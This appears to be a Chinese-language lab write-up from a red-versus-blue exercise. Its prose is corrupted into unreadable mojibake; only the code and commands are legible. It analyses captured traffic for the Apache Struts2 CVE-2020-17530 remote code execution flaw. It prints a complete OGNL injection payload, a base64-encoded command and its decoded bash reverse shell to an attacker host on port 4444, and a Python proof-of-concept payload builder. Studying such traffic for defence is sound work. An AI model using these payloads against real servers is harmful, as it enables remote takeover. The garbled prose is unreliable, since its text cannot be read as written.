- 2023å¹´7æœˆ18æ—¥ï¼Œé‡å¤è¯•äº†å¾ˆå¤šæ¬¡éƒ½ä¸èƒ½æ­£å¸¸è®¿é—®åˆ°æœ€å†…å±‚çš„ä¸»æœºåï¼Œæ— æ„é—´å‘ç°æœ€å†…å±‚çš„ä¸»æœºçš„å®¹å™¨åœ¨å¼€å¯åå°±é€€å‡ºäº†ï¼Œæœ¬æ¥æ˜¯é€šè¿‡`docker ps`æ¥æŸ¥çœ‹è¿è¡Œä¸­çš„å®¹å™¨ï¼Œå‘ç°å¹¶æ²¡æœ‰`vulshare/nginx-php-flag`çš„å®¹å™¨ï¼Œé€šè¿‡`docker ps -a`æŸ¥çœ‹åˆ°äº†`Exited(1)`çš„çŠ¶æ€ï¼Œå¹¶å°è¯•é€šè¿‡`docker logs`æ¥æŸ¥çœ‹å¼•å‘é”™è¯¯çš„æ—¥å¿—ï¼Œç»“æœä¹Ÿçœ‹ä¸å‡ºä»€ä¹ˆå¤´ç»ªï¼Œå•çœ‹pingçš„æŠ¥é”™çš„è¯ï¼Œåƒæ˜¯ç½‘å¡é…ç½®é—®é¢˜çš„æ ·å­ğŸ¤”

  ![screenShot](./img/2023-07-18-181704.png)

  ![screenShot](./img/2023-07-18-181813.png)
  
  æ‰€è°“çš„æ¼æ´æ‰“åŒ…é•œåƒï¼Œè¯´ç™½äº†ä¸å°±å’Œé»‘ç›’æ²¡ä»€ä¹ˆåŒºåˆ«å—ï¼Œæ’é”™å™©æ¢¦ï¼Œä¸è¿‡å€’æ˜¯ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆå®Œæˆäº†4å°æœºå™¨å°±å·²ç»æç¤ºé€šè¿‡äº†ï¼Œå› ä¸ºç¬¬äº”å°æ˜¯å®•æœºçŠ¶æ€å•ŠğŸ˜‚

### ç¬¬äºŒå›åˆ

>äºæ˜¯è¿™ä¸€éƒ¨åˆ†å¼€å§‹æ˜¯è“æ–¹æ£€æµ‹åˆ°çº¢æ–¹çš„æ”»å‡»å¹¶è¿›è¡Œä¸€å®šå¯¹æŠ—çš„ç¬¬äºŒå›åˆï¼Œé€šè¿‡å¯¹æŠ“å–çš„æ”»å‡»æµé‡è¿›è¡Œåˆ†æï¼Œå°è¯•å¯¹æ¼æ´åˆ©ç”¨è¿›è¡Œæ‹¦æˆª

- 2023å¹´7æœˆ19æ—¥ï¼Œé€šè¿‡æŸ¥çœ‹æŠ“å–åˆ°çš„æ”»å‡»æµé‡ï¼Œå°è¯•ä¸€ç‚¹ç‚¹åˆ†æstruts2å’Œweblogicä¸¤ä¸ªæ¼æ´çš„å®é™…payloadæ˜¯å¦‚ä½•å®ç°çš„  
  é¦–å…ˆæ˜¯struts2çš„CVE-2020-17530ï¼Œåœ¨æŠ“å–çš„æµé‡ä¸­æœ‰ä¸€æ¡é•¿åº¦ä¸º1309çš„HTTPæµé‡ï¼ŒPOSTè¯·æ±‚æ–¹å¼ï¼Œè¿™é‡Œè´´ä¸ŠHTTPåè®®ä¸­ç”¨äºä¸Šä¼ payloadéƒ¨åˆ†çš„Formä¸­Keyä¸ºidçš„å€¼ï¼š

  ```wireshark
  %{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec({"bash -c {echo,YmFzaCAtYyAnMDwmODYtO2V4ZWMgODY8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTA3LzQ0NDQ7c2ggPCY4NiA+Jjg2IDI+Jjg2Jw==}|{base64,-d}|bash"}))}
  ```

  å…¶ä¸­æ ¸å¿ƒæ‰§è¡Œçš„å†…å®¹æ˜¯ç”¨bashæ‰§è¡Œä¸€æ®µè¢«base64ç¼–ç çš„å†…å®¹ï¼š

  ```sh
  bash -c {echo,YmFzaCAtYyAnMDwmODYtO2V4ZWMgODY8Pi9kZXYvdGNwLzE5Mi4xNjguNTYuMTA3LzQ0NDQ7c2ggPCY4NiA+Jjg2IDI+Jjg2Jw==}|{base64,-d}|bash
  ```

  ä»…ç¼–ç éƒ¨åˆ†ç®€å•â€œç¿»è¯‘â€ï¼ˆDecodeï¼‰ä¸€ä¸‹ï¼Œæ‰§è¡Œçš„æ˜¯å¦‚ä¸‹å†…å®¹ï¼š

  ```sh
  bash -c '0<&86-;exec 86<>/dev/tcp/192.168.56.107/4444;sh <&86 >&86 2>&86'
  ```

  ä»¥æˆ‘çš„shellè¯­è¨€åŸºç¡€ï¼Œå¹¶ä¸æ˜¯å¾ˆçœ‹å¾—æ˜ç™½è¿™å¥è¯å…·ä½“åœ¨è¯´ä»€ä¹ˆï¼Œä¸è¿‡å¤§æ¦‚æ˜ç™½æ˜¯èµ°äº†ä¸€ä¸ªåå¼¹shï¼Œè½¬å‘åˆ°192.168.56.107ä¹Ÿå°±æ˜¯Attackerä¸»æœºçš„4444ç«¯å£

  è¿™éƒ¨åˆ†çš„åˆ©ç”¨é€»è¾‘ï¼Œåœ¨å’•å’•å™œCVE-2020-17530è¿™ä¸ªæ¼æ´çš„POCçš„æ—¶å€™æ‰¾åˆ°äº†å¾ˆè¿‘ä¼¼çš„ä»£ç ç‰‡æ®µï¼Œ[POC](https://github.com/CyborgSecurity/CVE-2020-17530/tree/master)æ˜¯ç”¨Pythonå†™çš„ï¼Œæ€è·¯ä¸Šå°±æ˜¯ç®€å•çš„requestsåŒ…é€šè¿‡POSTæ–¹å¼å‘å­—ç¬¦ä¸²æ‹¼æ¥å‡ºæ¥çš„ç›®æ ‡åœ°å€æ‰§è¡ŒæŒ‡å®šå‘½ä»¤ï¼Œè¿™é‡Œæ”¾ä¸Šå…¶payloadå‡½æ•°éƒ¨åˆ†ï¼š

  ```python
  #å¾ˆæ˜¾ç„¶ï¼Œcommandå°±æ˜¯ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤äº†ï¼Œç›¸æ¯”ä¸Šé¢Metasploitçš„exploitï¼Œå”¯ä¸€çš„åŒºåˆ«å¤§æ¦‚æ˜¯å°† #execute.exec()ä¸­çš„å†…å®¹å–å‡ºæ¥å¦æ‹¼äº†ä¸€æ®µarglistï¼Œçœ‹èµ·æ¥æ›´æ•´é½ä¸€äº›
  def build_payload(command):
    return '%{(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("' + command + '")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))}'
  ```

- 2023å¹´7æœˆ21æ—¥ï¼Œé’ˆå¯¹ä¸Šé¢å¯¹struts2çš„RCEåˆ†æï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°æ¯”è¾ƒç®€å•ä¸”æ˜“äºå®ç°çš„ä¿®è¡¥æ–¹å¼ï¼Œç½‘ç»œä¸Šçš„ä¿®è¡¥æ„è§éƒ½æ˜¯å»ºè®®å‡çº§Apache Strutsç‰ˆæœ¬å› ä¸ºå®˜æ–¹ç¡®å®å‘å¸ƒäº†ä¿®å¤ç‰ˆæœ¬ï¼Œåœ¨ä¸èƒ½å¤Ÿå‡çº§çš„ä¸‡ä¸å¾—å·²çš„æƒ…å†µä¸‹æ‰å»ºè®®é€šè¿‡â€œ[å¯¹ä¸å¯ä¿¡ç”¨æˆ·ç¦ç”¨forced OGNL evaluation](https://nsfocusglobal.com/struts2-s2-061-remote-code-execution-vulnerability-cve-2020-17530-threat-alert/)â€çš„è®¿é—®æ§åˆ¶æ€è·¯æ¥è§£å†³è¿™éƒ¨åˆ†é—®é¢˜ï¼Œå€’æ˜¯å¾ˆå¥½çš„è§£å†³æ€è·¯ğŸ¤”
